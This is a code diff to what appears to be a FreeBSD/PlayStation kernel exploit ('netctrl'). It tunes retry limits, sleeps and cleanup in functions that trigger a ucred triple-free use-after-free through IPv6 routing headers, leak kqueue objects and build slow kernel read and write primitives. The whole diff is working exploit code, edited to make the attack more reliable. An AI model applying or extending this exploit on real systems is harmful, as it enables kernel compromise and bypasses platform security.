@@ -837,17 +837,18 @@ function find_twins () {
   while (count < MAX_ROUNDS_TWIN) {
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        // Yield heavily — allocator may just be under temporary pressure
-        for (let _y = 0; _y < 20; _y++) { sched_yield() }
-        if (debugging.info.memory.available !== 0) {
-          zeroMemoryCount = 0
-          continue
+        if (zeroMemoryCount >= 15) {
+          // Yield heavily — allocator may just be under temporary pressure
+          for (let _y = 0; _y < 20; _y++) { sched_yield() }
+          nanosleep_fun(10000)
+          if (debugging.info.memory.available !== 0) {
+            zeroMemoryCount = 0
+            continue
+          }
+          log('netctrl failed! find_twins timeout')
+          cleanup()
+          return false
         }
-        log('netctrl failed!')
-        cleanup()
-        return false
-      }
     } else {
       zeroMemoryCount = 0
     }
@@ -1409,6 +1410,7 @@ function trigger_ucred_triplefree () {
       }
       // Clean up and start again
       close(new BigInt(uaf_socket))
+      close(new BigInt(dummy_socket)) // Phase 3: Prevent socket FD exhaustion
       continue
     }
 
@@ -1442,6 +1444,8 @@ function trigger_ucred_triplefree () {
       log('Dropped out from reclaim loop')
       // Clean up and start again
       close(new BigInt(uaf_socket))
+      close(new BigInt(dummy_socket)) // Phase 3: Prevent FD leak
+      free_rthdrs([ipv6_socks[twins[0]], ipv6_socks[twins[1]]]) // Phase 3: Free orphaned kernel heap memory
       continue
     }
 
@@ -1461,6 +1465,8 @@ function trigger_ucred_triplefree () {
       // if we break on 'read32(leak_rthdr) == 1', we never released workers
       write(new BigInt(iov_sock_1), tmp, 1)
       close(new BigInt(uaf_socket))
+      close(new BigInt(dummy_socket)) // Phase 3: Prevent FD leak
+      free_rthdrs([ipv6_socks[twins[0]], ipv6_socks[twins[1]]]) // Phase 3: Revert poisoned kernel memory state
       // Start again
       end = false
       continue
@@ -1478,6 +1484,8 @@ function trigger_ucred_triplefree () {
       log("Couldn't find triplet 2")
       // Clean up and start again
       close(new BigInt(uaf_socket))
+      close(new BigInt(dummy_socket)) // Phase 3: Prevent FD leak
+      free_rthdrs([ipv6_socks[twins[0]], ipv6_socks[triplets[1]]]) // Phase 3: Revert poisoned kernel memory state
       // Start again
       end = false
       continue
@@ -1512,6 +1520,7 @@ function leak_kqueue () {
   let count = 0
   while (count < KQUEUE_ITERATIONS) {
     kq = kqueue()
+    sched_yield() // Phase 3 SSD Mitigation: allow fast NVMe controllers an extra cycle to link object into process FD table
 
     // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
@@ -1687,8 +1696,8 @@ function kreadslow (addr: BigInt, size: number) {
     count2++
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
+      if (zeroMemoryCount2 >= 15) {
+        log('netctrl failed! kread iov timeout')
         cleanup()
         return BigInt_Error
       }
@@ -1809,8 +1818,8 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   while (true) {
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
+      if (zeroMemoryCount >= 15) {
+        log('netctrl failed! kwrite uio timeout')
         cleanup()
         return BigInt_Error
       }
@@ -1853,8 +1862,8 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   while (true) {
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
+      if (zeroMemoryCount2 >= 15) {
+        log('netctrl failed! kwrite iov timeout')
         cleanup()
         return BigInt_Error
       }
